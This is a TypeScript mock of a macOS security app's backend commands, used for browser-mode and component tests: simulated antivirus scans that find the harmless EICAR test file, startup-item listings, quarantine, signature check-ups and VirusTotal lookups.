// Simulated Security commands (store/security plan §6, §11.5) for browser mode and component tests.
// The virus database downloads only after consent; scans advance one step per tick and find the EICAR test file in
// Downloads; startup items cover every trust level, including one new unsigned daemon waiting for review.
// ?mock= switches: av-ready (database already downloaded), no-fda (startup categories that need Full Disk Access are
// missing), av-db-rate-limited (the update fails with a rate limit), av-engine-fail (scans stop before clamd starts).
import { events as ipcEvents } from '../bindings';
import { createMockScheduler } from './scheduler';
import type { AppSettings } from '../client';
import type {
  ActOutcome,
  AppError,
  AppSignatureReport,
  AvEngineStatus,
  AvFinding,
  AvScanKind,
  AvScanResult,
  AvScheduleStatus,
  InstallScanResult,
  PasteProtectionStatus,
  PostureCheck,
  ProtectionEvent,
  QuarantineEntry,
  SecurityOverview,
  StartupCategory,
  StartupItem,
  StartupSnapshot,
  Task,
  VirusTotalStatus
} from '../bindings';
import type { MockFailure, Step } from './runner';

const appError = (code: string, message: string, detail: string | null = null): AppError => ({ code, message, detail });

const HOUR = 60 * 60 * 1000;
const DAY = 24 * HOUR;
const MB = 1024 * 1024;
const GB = 1024 * MB;
/** SHA-256 of the EICAR antivirus test file. */
const EICAR_SHA256 = '275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f';

const posture = (): PostureCheck[] => [
  { id: 'sip', state: 'ok', facts: { enabled: true }, settingsUrl: null },
  { id: 'ssv', state: 'ok', facts: { enabled: true }, settingsUrl: null },
  {
    id: 'gatekeeper',
    state: 'bad',
    facts: { enabled: false },
    settingsUrl: 'x-apple.systempreferences:com.apple.settings.PrivacySecurity.extension'
  },
  { id: 'filevault', state: 'ok', facts: { enabled: true }, settingsUrl: null },
  {
    id: 'firewall',
    state: 'warn',
    facts: { enabled: false, stealth: false },
    settingsUrl: 'x-apple.systempreferences:com.apple.Network-Settings.extension?Firewall'
  },
  { id: 'xprotect', state: 'ok', facts: { version: 5367, updatedAt: Date.now() - 2 * DAY }, settingsUrl: null },
  { id: 'updates', state: 'ok', facts: { critical: true, configData: true }, settingsUrl: null },
  { id: 'screenlock', state: 'ok', facts: { delay: 'immediate', autoLogin: false }, settingsUrl: null },
  { id: 'autologin', state: 'ok', facts: { enabled: false }, settingsUrl: null },
  { id: 'guest', state: 'ok', facts: { enabled: false }, settingsUrl: null },
  {
    id: 'sharing',
    state: 'warn',
    facts: {
      'com.openssh.sshd': false,
      'com.apple.smbd': false,
      'com.apple.screensharing': true,
      'com.apple.RemoteDesktop.agent': false
    },
    settingsUrl: 'x-apple.systempreferences:com.apple.Sharing-Settings.extension'
  }
];

type ItemSeed = Omit<StartupItem, 'firstSeenAt' | 'isNew' | 'av' | 'args'> & {
  args?: string[];
  ageDays: number;
  isNew?: boolean;
};

const developer = (signer: string, teamId: string) => ({
  status: 'developer_id' as const,
  teamId,
  signer,
  notarized: true
});

// Ordinary Mac with Homebrew services, Docker and a few login items, plus one suspicious daemon added today.
const itemSeeds: ItemSeed[] = [
  {
    id: 'launch:system:com.helper.updater',
    category: 'launch_items',
    name: 'com.helper.updater',
    label: 'com.helper.updater',
    path: '/Library/LaunchDaemons/com.helper.updater.plist',
    program: '/usr/local/bin/hupd',
    args: ['--daemon'],
    scope: 'system',
    owner: null,
    signature: { status: 'adhoc', teamId: null, signer: null, notarized: false },
    trust: 'untrusted',
    state: 'running',
    triggers: ['at_load', 'keep_alive'],
    risk: 'high',
    actions: ['disable', 'remove', 'reveal', 'scan'],
    requiresAdmin: true,
    ageDays: 0,
    isNew: true
  },
  {
    id: 'launch:system:com.docker.vmnetd',
    category: 'launch_items',
    name: 'com.docker.vmnetd',
    label: 'com.docker.vmnetd',
    path: '/Library/LaunchDaemons/com.docker.vmnetd.plist',
    program: '/Library/PrivilegedHelperTools/com.docker.vmnetd',
    scope: 'system',
    owner: { name: 'Docker', bundleId: 'com.docker.docker', path: '/Applications/Docker.app', iconPath: null },
    signature: developer('Docker Inc', '9BNSXJN65R'),
    trust: 'known',
    state: 'running',
    triggers: ['at_load', 'keep_alive'],
    risk: 'none',
    actions: ['disable', 'remove', 'reveal', 'scan'],
    requiresAdmin: true,
    ageDays: 210
  },
  {
    // A login item helper the app registered through ServiceManagement: launchctl switches it.
    id: 'btm:4.com.docker.helper',
    category: 'btm',
    name: 'DockerHelper',
    label: '4.com.docker.helper',
    path: '/Applications/Docker.app/Contents/Library/LoginItems/DockerHelper.app',
    program: '/Applications/Docker.app/Contents/Library/LoginItems/DockerHelper.app/Contents/MacOS/DockerHelper',
    scope: 'user',
    owner: { name: 'Docker', bundleId: 'com.docker.docker', path: '/Applications/Docker.app', iconPath: null },
    signature: developer('Docker Inc', '9BNSXJN65R'),
    trust: 'known',
    state: 'enabled',
    triggers: ['at_load'],
    risk: 'none',
    actions: ['disable', 'reveal', 'scan', 'open_settings'],
    requiresAdmin: false,
    ageDays: 210
  },
  {
    // Registered to open at login once, then switched off: switching it on adds it to the login items list.
    id: 'login:/Applications/Visual Studio Code.app',
    category: 'login_items',
    name: 'Visual Studio Code',
    label: null,
    path: '/Applications/Visual Studio Code.app',
    program: '/Applications/Visual Studio Code.app/Contents/MacOS/Code',
    scope: 'user',
    owner: {
      name: 'Visual Studio Code',
      bundleId: 'com.microsoft.VSCode',
      path: '/Applications/Visual Studio Code.app',
      iconPath: null
    },
    signature: developer('Microsoft Corporation', 'UBF8T346G9'),
    trust: 'known',
    state: 'disabled',
    triggers: ['at_load'],
    risk: 'none',
    actions: ['enable', 'reveal', 'scan', 'open_settings'],
    requiresAdmin: false,
    ageDays: 30
  },
  {
    id: 'launch:user:com.google.GoogleUpdater.wake',
    category: 'launch_items',
    name: 'com.google.GoogleUpdater.wake',
    label: 'com.google.GoogleUpdater.wake',
    path: '~/Library/LaunchAgents/com.google.GoogleUpdater.wake.plist',
    program:
      '~/Library/Application Support/Google/GoogleUpdater/Current/GoogleUpdater.app/Contents/MacOS/GoogleUpdater',
    args: ['--wake-all'],
    scope: 'user',
    owner: {
      name: 'Google Chrome',
      bundleId: 'com.google.Chrome',
      path: '/Applications/Google Chrome.app',
      iconPath: null
    },
    signature: developer('Google LLC', 'EQHXZ8M8AV'),
    trust: 'known',
    state: 'disabled',
    triggers: ['interval'],
    risk: 'none',
    actions: ['enable', 'remove', 'reveal', 'scan'],
    requiresAdmin: false,
    ageDays: 400
  },
  {
    id: 'launch:user:homebrew.mxcl.postgresql@16',
    category: 'launch_items',
    name: 'homebrew.mxcl.postgresql@16',
    label: 'homebrew.mxcl.postgresql@16',
    path: '~/Library/LaunchAgents/homebrew.mxcl.postgresql@16.plist',
    program: '/opt/homebrew/opt/postgresql@16/bin/postgres',
    args: ['-D', '/opt/homebrew/var/postgresql@16'],
    scope: 'user',
    owner: null,
    signature: { status: 'adhoc', teamId: null, signer: null, notarized: false },
    trust: 'unknown',
    state: 'running',
    triggers: ['at_load', 'keep_alive'],
    risk: 'none',
    actions: ['disable', 'remove', 'reveal', 'scan'],
    requiresAdmin: false,
    ageDays: 90
  },
  {
    id: 'login:raycast',
    category: 'login_items',
    name: 'Raycast',
    label: null,
    path: '/Applications/Raycast.app',
    program: '/Applications/Raycast.app/Contents/MacOS/Raycast',
    scope: 'user',
    owner: { name: 'Raycast', bundleId: 'com.raycast.macos', path: '/Applications/Raycast.app', iconPath: null },
    signature: developer('Raycast Technologies Inc.', 'SY64MV22J9'),
    trust: 'known',
    state: 'enabled',
    triggers: ['at_load'],
    risk: 'none',
    // Open at Login switches off with a backup and back on (S2).
    actions: ['disable', 'reveal', 'scan', 'open_settings'],
    requiresAdmin: false,
    ageDays: 300
  },
  {
    id: 'btm:com.adobe.spelling',
    category: 'btm',
    name: 'Adobe Spelling Helper',
    label: 'com.adobe.spelling',
    path: '/Library/Application Support/Adobe/SpellingHelper.app',
    program: '/Library/Application Support/Adobe/SpellingHelper.app/Contents/MacOS/SpellingHelper',
    scope: 'user',
    owner: {
      name: 'Adobe Photoshop 2026',
      bundleId: 'com.adobe.Photoshop',
      path: '/Applications/Adobe Photoshop 2026',
      iconPath: null
    },
    signature: developer('Adobe Inc.', 'JQ525L2MZD'),
    trust: 'known',
    state: 'enabled',
    triggers: ['at_load'],
    risk: 'none',
    actions: ['open_settings', 'reveal', 'scan'],
    requiresAdmin: false,
    ageDays: 120
  },
  {
    id: 'launch:system:com.apple.metadata.mds',
    category: 'launch_items',
    name: 'com.apple.metadata.mds',
    label: 'com.apple.metadata.mds',
    path: '/System/Library/LaunchDaemons/com.apple.metadata.mds.plist',
    program: '/System/Library/Frameworks/CoreServices.framework/Frameworks/Metadata.framework/Support/mds',
    scope: 'system',
    owner: null,
    signature: { status: 'apple', teamId: null, signer: 'Software Signing', notarized: null },
    trust: 'apple',
    state: 'running',
    triggers: ['at_load', 'keep_alive'],
    risk: 'none',
    actions: ['reveal'],
    requiresAdmin: false,
    ageDays: 600
  },
  {
    id: 'ext:chrome:ublock-lite',
    category: 'browser_extensions',
    name: 'uBlock Origin Lite',
    label: 'ddkjiahejlhfcafbddmgiahcphecmpfh',
    path: '~/Library/Application Support/Google/Chrome/Default/Extensions/ddkjiahejlhfcafbddmgiahcphecmpfh',
    program: null,
    scope: 'user',
    owner: {
      name: 'Google Chrome',
      bundleId: 'com.google.Chrome',
      path: '/Applications/Google Chrome.app',
      iconPath: null
    },
    signature: { status: 'not_code', teamId: null, signer: null, notarized: null },
    trust: 'unknown',
    state: 'enabled',
    triggers: [],
    risk: 'none',
    actions: ['reveal'],
    requiresAdmin: false,
    ageDays: 250
  },
  {
    id: 'cron:user:0',
    category: 'cron',
    name: '0 * * * * ~/bin/sync.sh',
    label: null,
    path: '/usr/lib/cron/tabs/user',
    program: '~/bin/sync.sh',
    scope: 'user',
    owner: null,
    signature: { status: 'not_code', teamId: null, signer: null, notarized: null },
    trust: 'unknown',
    state: 'enabled',
    triggers: ['calendar'],
    risk: 'notice',
    actions: ['remove', 'reveal'],
    requiresAdmin: false,
    ageDays: 30
  },
  {
    id: 'sysext:com.example.vpn.extension',
    category: 'system_extensions',
    name: 'Example VPN Network Extension',
    label: 'com.example.vpn.extension',
    path: '/Library/SystemExtensions/1A2B3C/com.example.vpn.extension.systemextension',
    program: null,
    scope: 'system',
    owner: { name: 'Example VPN', bundleId: 'com.example.vpn', path: '/Applications/Example VPN.app', iconPath: null },
    signature: developer('Example Networks Ltd', 'Q8XY7Z6W5V'),
    trust: 'known',
    state: 'enabled',
    triggers: ['events'],
    risk: 'none',
    actions: ['open_settings', 'reveal'],
    requiresAdmin: false,
    ageDays: 60
  },
  {
    id: 'launch:user:com.example.remote.helper',
    category: 'launch_items',
    name: 'com.example.remote.helper',
    label: 'com.example.remote.helper',
    path: '/Library/LaunchAgents/com.example.remote.helper.plist',
    program:
      '/Applications/Example Remote.app/Contents/Library/LoginItems/RemoteHelper.app/Contents/MacOS/RemoteHelper',
    scope: 'system',
    owner: {
      name: 'Example Remote',
      bundleId: 'com.example.remote',
      path: '/Applications/Example Remote.app',
      iconPath: null
    },
    signature: { status: 'modified', teamId: 'R3M0T3HLP1', signer: 'Example Remote Inc.', notarized: true },
    trust: 'known',
    state: 'running',
    triggers: ['at_load', 'keep_alive'],
    risk: 'notice',
    actions: ['disable', 'remove', 'reveal', 'scan'],
    requiresAdmin: true,
    ageDays: 120
  },
  {
    id: 'shell:zshrc',
    category: 'shell_config',
    name: '.zshrc',
    label: null,
    path: '~/.zshrc',
    program: null,
    scope: 'user',
    owner: null,
    signature: { status: 'not_code', teamId: null, signer: null, notarized: null },
    trust: 'unknown',
    state: 'enabled',
    triggers: ['events'],
    risk: 'none',
    actions: ['reveal'],
    requiresAdmin: false,
    ageDays: 700
  }
];

/** A signature check-up: one app re-signed by another developer, one unsigned, one not notarized; the rest clean. */
const signatureFixture = (now = Date.now()): AppSignatureReport => {
  const signed = (teamId: string, signer: string) =>
    ({ status: 'developer_id', teamId, signer, notarized: true }) as const;
  return {
    checkedAt: now,
    apps: [
      {
        path: '/Applications/Lumen.app',
        name: 'Lumen',
        bundleId: 'app.lumen.notes',
        signature: { status: 'developer_id', teamId: 'Q9X8W7V6U5', signer: 'Unknown Developer', notarized: true },
        previousTeamId: '7Q2XK4M9PL',
        issues: ['team_changed'],
        changed: true,
        errorCode: null
      },
      {
        path: '/Applications/Old Tool.app',
        name: 'Old Tool',
        bundleId: 'com.example.oldtool',
        signature: { status: 'unsigned', teamId: null, signer: null, notarized: null },
        previousTeamId: null,
        issues: ['unsigned'],
        changed: false,
        errorCode: null
      },
      {
        path: '/Applications/Side Project.app',
        name: 'Side Project',
        bundleId: 'dev.side.project',
        signature: { status: 'developer_id', teamId: 'ABCDE12345', signer: 'Side Dev', notarized: false },
        previousTeamId: 'ABCDE12345',
        issues: ['not_notarized'],
        changed: false,
        errorCode: null
      },
      {
        path: '/Applications/Visual Studio Code.app',
        name: 'Visual Studio Code',
        bundleId: 'com.microsoft.VSCode',
        signature: signed('UBF8T346G9', 'Microsoft Corporation'),
        previousTeamId: 'UBF8T346G9',
        issues: [],
        changed: false,
        errorCode: null
      }
    ]
  };
};

/** Categories that need Full Disk Access to read (BTM store, other users' cron tabs). */
const NEEDS_FDA: StartupCategory[] = ['btm', 'cron'];

export interface SecurityMockOptions {
  flags: ReadonlySet<string>;
  tickMs: number;
  /** Settings saved through settings_set. */
  settings: () => AppSettings;
}

export function createSecurityMock({ flags, tickMs, settings }: SecurityMockOptions) {
  const now = Date.now();
  const ready = flags.has('av-ready');
  const engine: AvEngineStatus = {
    version: '1.5.4',
    running: false,
    residentBytes: null,
    updating: false,
    db: ready ? { daily: 28154, main: 63, bytecode: 339, updatedAt: now - 3 * HOUR, bytes: 113 * MB } : null,
    lastError: null
  };
  let items: StartupItem[] = itemSeeds.map(({ ageDays, isNew = false, args = [], ...seed }) => ({
    ...seed,
    args,
    firstSeenAt: now - ageDays * DAY,
    isNew,
    av: null
  }));
  const quarantine: QuarantineEntry[] = [];
  /** The finding each quarantined threat came from (Rust's quarantine metadata). */
  const quarantinedFindings = new Map<string, AvFinding>();
  const events: ProtectionEvent[] = [
    {
      id: 'event-1',
      at: now - 2 * HOUR,
      kind: 'startup_added',
      name: 'com.helper.updater',
      path: '/Library/LaunchDaemons/com.helper.updater.plist',
      itemId: 'launch:system:com.helper.updater',
      handled: false
    }
  ];
  const scans = new Map<string, AvScanResult>();
  const scheduler = createMockScheduler();
  let lastScanId: string | null = null;
  let sequence = 0;

  const changed = (reason: 'posture' | 'engine' | 'startup' | 'quarantine' | 'events') =>
    void ipcEvents.securityChanged.emit({ reason });

  const openFindings = () =>
    [...scans.values()].flatMap(scan => scan.findings).filter(finding => finding.status === 'open').length;

  function overview(): SecurityOverview {
    const last = lastScanId ? scans.get(lastScanId) : undefined;
    const thirdParty = items.filter(item => item.trust !== 'apple');
    const pendingReview = items.filter(item => item.isNew).length;
    const current = settings();
    return {
      posture: posture(),
      engine: { ...engine },
      lastScan: last
        ? {
            scanId: last.scanId,
            kind: last.kind,
            state: last.state,
            finishedAt: last.finishedAt,
            filesScanned: last.filesScanned,
            threats: last.findings.length
          }
        : null,
      startup: {
        total: items.length,
        thirdParty: thirdParty.length,
        untrusted: thirdParty.filter(item => item.trust === 'untrusted').length,
        pendingReview,
        changedAt: Math.max(...items.map(item => item.firstSeenAt))
      },
      protection: {
        startupAlerts: current.startupAlerts,
        watchDownloads: current.avConsent && current.watchDownloads,
        endpointSecurity: 'unavailable',
        firewall: 'unavailable'
      },
      quarantine: { count: quarantine.length, bytes: quarantine.reduce((sum, entry) => sum + entry.sizeBytes, 0) },
      attention: openFindings() + pendingReview
    };
  }

  function snapshot(): StartupSnapshot {
    const missing = flags.has('no-fda') ? NEEDS_FDA : [];
    return {
      scannedAt: Date.now(),
      items: items.filter(item => !missing.includes(item.category)),
      missing,
      btmFormat: missing.length ? null : 'v18'
    };
  }

  function updateDatabase(): string {
    if (!settings().avConsent) throw appError('E_AV_CONSENT', 'consent_required');
    if (flags.has('av-db-rate-limited')) throw appError('E_AV_DB_RATE_LIMITED', 'rate_limited', '14400');
    engine.updating = true;
    changed('engine');
    const id = `av-db-${++sequence}`;
    scheduler.later(() => {
      engine.updating = false;
      engine.db = { daily: 28155, main: 63, bytecode: 339, updatedAt: Date.now(), bytes: 113 * MB };
      changed('engine');
    }, tickMs * 4);
    return id;
  }

  const TOTALS: Record<AvScanKind, { files: number; bytes: number; ticks: number }> = {
    quick: { files: 18_204, bytes: 3.1 * GB, ticks: 6 },
    full: { files: 812_440, bytes: 182 * GB, ticks: 12 },
    custom: { files: 2_310, bytes: 640 * MB, ticks: 3 }
  };

  function startScan(kind: AvScanKind, paths: string[] | null, force = false): { scanId: string } {
    if (!engine.db) throw appError('E_AV_NOT_READY', 'database_missing');
    if (kind === 'custom' && !paths?.length) throw appError('E_INVALID_ARG', 'paths_required');
    const scanId = `scan-${++sequence}`;
    const total = TOTALS[kind];
    const scan: AvScanResult = {
      scanId,
      kind,
      state: 'running',
      startedAt: Date.now(),
      finishedAt: null,
      filesScanned: 0,
      bytesScanned: 0,
      skipped: { dataless: 0, tooLarge: 0, unreadable: 0, excluded: 0 },
      metrics: {
        cachedFiles: 0,
        workers: kind === 'full' ? 2 : 1,
        preparationMs: 0,
        hashMs: 0,
        engineMs: 0,
        queueMs: 0,
        inspectionMs: 0,
        cleanupMs: 0,
        persistenceMs: 0,
        slowFiles: 0
      },
      findings: [],
      errorCode: null,
      // ?mock=av-denied-downloads: macOS refused the Downloads folder (Files and Folders privacy).
      deniedRoots: flags.has('av-denied-downloads') ? ['/Users/mock/Downloads'] : []
    };
    scans.set(scanId, scan);
    lastScanId = scanId;
    // ?mock=av-engine-fail: clamd does not start (as when its socket path was too long); the scan ends at once.
    if (flags.has('av-engine-fail')) {
      Object.assign(scan, { state: 'failed', finishedAt: Date.now(), errorCode: 'E_AV_ENGINE' });
      scheduler.later(() => void ipcEvents.avFinished.emit(JSON.parse(JSON.stringify(scan)) as AvScanResult), tickMs);
      return { scanId };
    }
    engine.running = true;
    engine.residentBytes = 1.6 * GB;
    changed('engine');
    let step = 0;
    const timer = scheduler.repeat(() => {
      if (scan.state !== 'running') {
        scheduler.cancelRepeat(timer!);
        return;
      }
      step++;
      scan.filesScanned = Math.round((total.files * step) / total.ticks);
      if (flags.has('av-cache-hit') && !force) scan.metrics.cachedFiles = Math.floor(scan.filesScanned / 2);
      scan.bytesScanned = Math.round((total.bytes * step) / total.ticks);
      // The EICAR test file sits in Downloads; every scan kind reaches it halfway.
      if (step === Math.ceil(total.ticks / 2) && kind !== 'custom') {
        const finding: AvFinding = {
          id: `${scanId}:eicar`,
          path: '~/Downloads/tools/eicar.com',
          signature: 'Eicar-Test-Signature',
          sizeBytes: 68,
          sha256: EICAR_SHA256,
          ownerApp: null,
          requiresAdmin: false,
          status: 'open'
        };
        scan.findings.push(finding);
        events.unshift({
          id: `event-${++sequence}`,
          at: Date.now(),
          kind: 'scan_threat',
          name: 'eicar.com',
          path: finding.path,
          itemId: null,
          handled: false
        });
      }
      if (step >= total.ticks) {
        scan.state = 'done';
        scan.finishedAt = Date.now();
        scan.skipped = {
          dataless: kind === 'full' ? 3_120 : 14,
          tooLarge: kind === 'full' ? 42 : 2,
          unreadable: 0,
          excluded: 0
        };
        scheduler.cancelRepeat(timer!);
        void ipcEvents.avFinished.emit(JSON.parse(JSON.stringify(scan)) as AvScanResult);
        changed('events');
        return;
      }
      void ipcEvents.avProgress.emit({
        scanId,
        filesScanned: scan.filesScanned,
        bytesScanned: scan.bytesScanned,
        currentPath: kind === 'full' ? '~/Library/Containers/com.apple.mail/Data' : '~/Downloads/tools',
        findings: scan.findings.length,
        cachedFiles: scan.metrics.cachedFiles
      });
    }, tickMs);
    return { scanId };
  }

  function actOnFindings(scanId: string, ids: string[], action: string): ActOutcome {
    const scan = scans.get(scanId);
    if (!scan) throw appError('E_NOT_FOUND', 'scan_not_found');
    const done: string[] = [];
    for (const finding of scan.findings.filter(item => ids.includes(item.id))) {
      if (action === 'reveal') {
        done.push(finding.id);
        continue;
      }
      if (finding.status !== 'open') continue;
      finding.status = action === 'quarantine' ? 'quarantined' : action === 'delete' ? 'deleted' : 'trusted';
      if (action === 'quarantine') {
        const id = `q-${++sequence}`;
        quarantinedFindings.set(id, finding);
        quarantine.unshift({
          id,
          name: finding.path.split('/').pop() ?? finding.path,
          originalPath: finding.path,
          sizeBytes: finding.sizeBytes,
          sha256: finding.sha256,
          reason: { kind: 'threat', signature: finding.signature },
          quarantinedAt: Date.now()
        });
      }
      done.push(finding.id);
    }
    changed(action === 'quarantine' ? 'quarantine' : 'events');
    return { done, failed: [], restorable: action === 'quarantine' };
  }

  function actOnStartup(ids: string[], action: string): ActOutcome {
    const done: string[] = [];
    const failed: { id: string; code: string }[] = [];
    for (const id of ids) {
      const item = items.find(entry => entry.id === id);
      if (!item) {
        failed.push({ id, code: 'E_NOT_FOUND' });
        continue;
      }
      if (item.trust === 'apple' && action !== 'reveal') {
        failed.push({ id, code: 'E_STARTUP_PROTECTED' });
        continue;
      }
      if (action === 'disable') {
        item.state = 'disabled';
        item.actions = item.actions.map(entry => (entry === 'disable' ? 'enable' : entry));
      } else if (action === 'enable') {
        item.state = item.triggers.includes('keep_alive') ? 'running' : 'enabled';
        item.actions = item.actions.map(entry => (entry === 'enable' ? 'disable' : entry));
      } else if (action === 'remove' && (item.category === 'cron' || item.category === 'login_items')) {
        // Current-user crontab lines and login items are removed with a backup the same item restores; until then
        // Restore is all that is left, as in Rust.
        item.state = 'removed';
        item.actions = ['restore'];
      } else if (action === 'restore') {
        item.state = 'enabled';
        item.actions = item.category === 'cron' ? ['remove', 'reveal'] : ['remove', 'reveal', 'scan'];
      } else if (action === 'remove') {
        items = items.filter(entry => entry.id !== id);
        quarantine.unshift({
          id: `q-${++sequence}`,
          name: item.path.split('/').pop() ?? item.name,
          originalPath: item.path,
          sizeBytes: 1_024,
          sha256: '9f2c0e1d5b7a4c3e8f6a1b2d3c4e5f60718293a4b5c6d7e8f9a0b1c2d3e4f5a6',
          reason: { kind: 'startup' },
          quarantinedAt: Date.now()
        });
      } else if (action === 'scan') {
        item.av = { clean: true, signature: null, scannedAt: Date.now() };
      }
      if (action !== 'reveal' && action !== 'open_settings') item.isNew = false;
      done.push(id);
    }
    const quarantined =
      action === 'remove' && items.every(entry => !ids.includes(entry.id) || entry.state !== 'removed');
    changed(quarantined ? 'quarantine' : 'startup');
    return { done, failed, restorable: action === 'remove' };
  }

  /** Like Rust: the app goes in the login items list and is listed at once, not as a new item. */
  function addLoginItem(path: string): StartupItem {
    if (!path.endsWith('.app')) throw appError('E_INVALID_ARG', 'startup_login_app');
    const existing = items.find(item => item.category === 'login_items' && item.path === path);
    if (existing?.state === 'enabled') throw appError('E_LOGIN_ITEM_EXISTS', 'startup_login_exists');
    const name =
      path
        .split('/')
        .pop()
        ?.replace(/\.app$/, '') ?? path;
    const item: StartupItem = {
      id: `login:${path}`,
      category: 'login_items',
      name,
      label: null,
      path,
      program: `${path}/Contents/MacOS/${name}`,
      args: [],
      scope: 'user',
      owner: { name, bundleId: null, path, iconPath: null },
      signature: developer(`${name} Developer`, 'ABCDE12345'),
      trust: 'known',
      state: 'enabled',
      triggers: ['at_load'],
      firstSeenAt: Date.now(),
      isNew: false,
      risk: 'none',
      actions: ['disable', 'reveal', 'scan', 'open_settings'],
      requiresAdmin: false,
      av: null
    };
    items = [...items.filter(entry => entry.id !== item.id), item];
    changed('startup');
    return item;
  }

  // Restoring and deleting both take the entry out of the quarantine list.
  /** Like Rust: restoring reopens the finding a quarantined threat came from, deleting marks it deleted. */
  function removeQuarantine(ids: string[], status: AvFinding['status']): ActOutcome {
    const done: string[] = [];
    for (const id of ids) {
      const index = quarantine.findIndex(entry => entry.id === id);
      if (index < 0) continue;
      quarantine.splice(index, 1);
      const finding = quarantinedFindings.get(id);
      if (finding) finding.status = status;
      quarantinedFindings.delete(id);
      done.push(id);
    }
    changed('quarantine');
    return { done, failed: [], restorable: false };
  }

  // S2 (plan §6): scheduled scans, signature check-up, paste protection and VirusTotal.
  let signatureReport: AppSignatureReport | null = null;
  let accessibility = flags.has('paste-ax');
  let virusTotalKey = false;
  const pastes = new Set<string>();

  function scheduleStatus(): AvScheduleStatus {
    const current = settings();
    if (current.avSchedule === 'off') return { nextRunAt: null, lastRun: null };
    const [hours, minutes] = current.avScheduleTime.split(':').map(Number);
    const next = new Date();
    next.setHours(hours ?? 3, minutes ?? 0, 0, 0);
    if (next.getTime() <= Date.now()) next.setDate(next.getDate() + 1);
    if (current.avSchedule === 'weekly')
      while (((next.getDay() + 6) % 7) + 1 !== current.avScheduleWeekday) next.setDate(next.getDate() + 1);
    return {
      nextRunAt: next.getTime(),
      lastRun: {
        scheduledAt: Date.now() - DAY,
        scanId: null,
        skipped: ready ? 'on_battery' : 'no_database',
        errorCode: null
      }
    };
  }

  function pasteStatus(): PasteProtectionStatus {
    const enabled = settings().pasteProtection;
    return { enabled, accessibilityGranted: accessibility, listening: enabled && accessibility };
  }

  function virusTotalStatus(): VirusTotalStatus {
    return { enabled: settings().virusTotalEnabled, hasKey: virusTotalKey, retryAfterSecs: 0 };
  }

  const handlers: Record<string, (args: Record<string, unknown>) => unknown> = {
    security_overview: () => overview(),
    posture_check: () => posture(),
    av_engine_status: () => ({ ...engine }),
    av_db_update: () => updateDatabase(),
    av_scan_start: args =>
      startScan(args.kind as AvScanKind, (args.paths as string[] | null) ?? null, args.force === true),
    av_scan_cancel: args => {
      const scan = scans.get(String(args.scanId));
      if (scan?.state === 'running') {
        scan.state = 'canceled';
        scan.finishedAt = Date.now();
        void ipcEvents.avFinished.emit(JSON.parse(JSON.stringify(scan)) as AvScanResult);
      }
      return null;
    },
    av_scan_get: args => {
      const scan = scans.get(String(args.scanId));
      if (!scan) throw appError('E_NOT_FOUND', 'scan_not_found');
      return scan;
    },
    av_findings_act: args =>
      actOnFindings(String(args.scanId), (args.findingIds as string[]) ?? [], String(args.action)),
    quarantine_list: () => quarantine,
    quarantine_restore: args => removeQuarantine((args.ids as string[]) ?? [], 'open'),
    quarantine_delete: args => removeQuarantine((args.ids as string[]) ?? [], 'deleted'),
    startup_scan: () => snapshot(),
    startup_cached: () => snapshot(),
    startup_login_add: args => addLoginItem(String(args.path)),
    startup_item_act: args => actOnStartup((args.ids as string[]) ?? [], String(args.action)),
    protection_events: args => events.slice(0, Number(args.limit ?? 50)),
    av_schedule_status: () => scheduleStatus(),
    app_signature_get: () => signatureReport,
    app_signature_check: () => {
      signatureReport = signatureFixture();
      return signatureReport;
    },
    paste_protection_status: () => pasteStatus(),
    paste_protection_request_access: () => {
      accessibility = true;
      return pasteStatus();
    },
    paste_protection_act: args => {
      if (!pastes.delete(String(args.id))) throw appError('E_PASTE_EXPIRED', 'paste_expired');
      return null;
    },
    virus_total_status: () => virusTotalStatus(),
    virus_total_key_set: args => {
      const key = (args.key as string | null) ?? null;
      if (key !== null && !/^[0-9a-f]{64}$/i.test(key)) throw appError('E_VT_KEY_INVALID', 'key_format');
      virusTotalKey = key !== null;
      return virusTotalStatus();
    },
    // The EICAR test file is flagged by most engines; a link app's fresh download has no record yet.
    virus_total_lookup: args => {
      if (!settings().virusTotalEnabled) throw appError('E_VT_DISABLED', 'disabled');
      if (!virusTotalKey) throw appError('E_VT_KEY_REQUIRED', 'key_required');
      const sha256 = String(args.sha256);
      const eicar = sha256 === EICAR_SHA256;
      return {
        sha256,
        found: sha256 !== 'a'.repeat(64),
        malicious: eicar ? 62 : 0,
        suspicious: 0,
        harmless: 0,
        undetected: eicar ? 8 : 70,
        lastAnalysisAt: Date.now() - DAY,
        permalink: `https://www.virustotal.com/gui/file/${sha256}`
      };
    }
  };

  // Scan before installing (S2): Homebrew installs and updates are scanned after the download once the switch is on
  // with consent and the database ready; ?mock=install-threat finds EICAR, which fails the task right there.
  const installScans = new Map<string, InstallScanResult>();
  /** Index of the scan in a Homebrew install or update: after preparing and downloading. */
  const SCAN_STEP = 2;
  function scanStep(task: Task): Step | undefined {
    const kind = task.target?.kind;
    if ((task.op !== 'install' && task.op !== 'upgrade') || (kind !== 'formula' && kind !== 'cask')) return;
    const current = settings();
    const scanned = current.avScanBeforeInstall && current.avConsent && engine.db !== null;
    const threat = scanned && flags.has('install-threat');
    const result: InstallScanResult = {
      taskId: task.id,
      state: !current.avScanBeforeInstall ? 'disabled' : !scanned ? 'skipped' : threat ? 'threat' : 'clean',
      filesScanned: scanned ? 3 : 0,
      avSkipped: current.avScanBeforeInstall && !scanned ? (current.avConsent ? 'no_database' : 'no_consent') : null,
      threats: threat ? ['Eicar-Test-Signature'] : [],
      checkedAt: Date.now()
    };
    installScans.set(task.id, result);
    if (result.state !== 'clean' && result.state !== 'threat') {
      // prepare_install saves and emits disabled/skipped results too, without a scanning phase.
      void ipcEvents.installScanned.emit(result);
      return;
    }
    return {
      phase: 'scanning',
      from: 70,
      to: 70,
      ticks: 3,
      indeterminate: true,
      lines: [`==> Scanning ${result.filesScanned} downloaded files`],
      enter: () => {
        void ipcEvents.installScanned.emit(result);
        if (threat)
          events.unshift({
            id: `event-${++sequence}`,
            at: Date.now(),
            kind: 'install_threat',
            name: task.id,
            path: task.id,
            itemId: null,
            handled: false
          });
      }
    };
  }
  function installFailure(task: Task): MockFailure | undefined {
    const result = installScans.get(task.id);
    if (result?.state !== 'threat') return;
    return {
      step: SCAN_STEP,
      error: appError(
        'E_INSTALL_THREAT',
        'install_threat',
        JSON.stringify({ taskId: task.id, signatures: result.threats })
      ),
      lines: [`==> Scanning ${result.filesScanned} downloaded files`, `==> Found ${result.threats.join(', ')}`]
    };
  }
  handlers.install_scan_get = args => installScans.get(String(args.taskId)) ?? null;

